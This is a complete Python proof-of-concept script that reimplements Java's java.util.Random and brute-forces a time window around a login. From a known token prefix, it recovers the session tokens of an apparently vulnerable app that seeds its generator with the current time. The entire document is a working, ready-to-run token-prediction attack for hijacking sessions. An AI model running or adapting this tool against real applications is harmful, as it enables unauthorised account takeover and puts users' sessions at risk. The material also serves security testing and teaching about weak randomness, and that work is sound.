#!/usr/bin/env python3
"""PoC: Recover candidate Java Random seeds for Login.generateSessionToken().

The vulnerable app generates a 16-char token via java.util.Random seeded with current time.
If an attacker knows approximate login time and (part of) token, they can narrow candidates.
"""

from __future__ import annotations

import argparse
from dataclasses import dataclass

ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
MASK = (1 << 48) - 1
MULT = 0x5DEECE66D
ADD = 0xB


@dataclass
class JavaRandom:
    seed: int

    @classmethod
    def from_millis(cls, millis: int) -> "JavaRandom":
        # Matches java.util.Random(long seed) initialization
        return cls((millis ^ MULT) & MASK)

    def next_bits(self, bits: int) -> int:
        self.seed = (self.seed * MULT + ADD) & MASK
        return self.seed >> (48 - bits)

    def next_int(self, bound: int) -> int:
        if bound <= 0:
            raise ValueError("bound must be positive")
        if bound & (bound - 1) == 0:
            return (bound * self.next_bits(31)) >> 31
        while True:
            bits = self.next_bits(31)
            val = bits % bound
            if bits - val + (bound - 1) >= 0:
                return val


def generate_token(millis: int, length: int = 16) -> str:
    rng = JavaRandom.from_millis(millis)
    return "".join(ALPHABET[rng.next_int(62)] for _ in range(length))


def search_window(target_prefix: str, center_ms: int, window_ms: int, limit: int = 20):
    hits = []
    start = center_ms - window_ms
    end = center_ms + window_ms
    for ms in range(start, end + 1):
        tok = generate_token(ms)
        if tok.startswith(target_prefix):
            hits.append((ms, tok))
            if len(hits) >= limit:
                break
    return hits


def main() -> None:
    parser = argparse.ArgumentParser(description="Bruteforce predictable session tokens in a time window")
    parser.add_argument("--prefix", required=True, help="Known token prefix, e.g., 4-8 chars")
    parser.add_argument("--center-ms", type=int, required=True, help="Approx login epoch millis")
    parser.add_argument("--window-ms", type=int, default=5000, help="Search +/- window in milliseconds")
    parser.add_argument("--limit", type=int, default=20, help="Maximum matches to print")
    args = parser.parse_args()

    hits = search_window(args.prefix, args.center_ms, args.window_ms, args.limit)
    if not hits:
        print("No candidates found in range.")
        return

    print(f"Found {len(hits)} candidate(s):")
    for ms, tok in hits:
        print(f"  ms={ms} token={tok}")


if __name__ == "__main__":
    main()
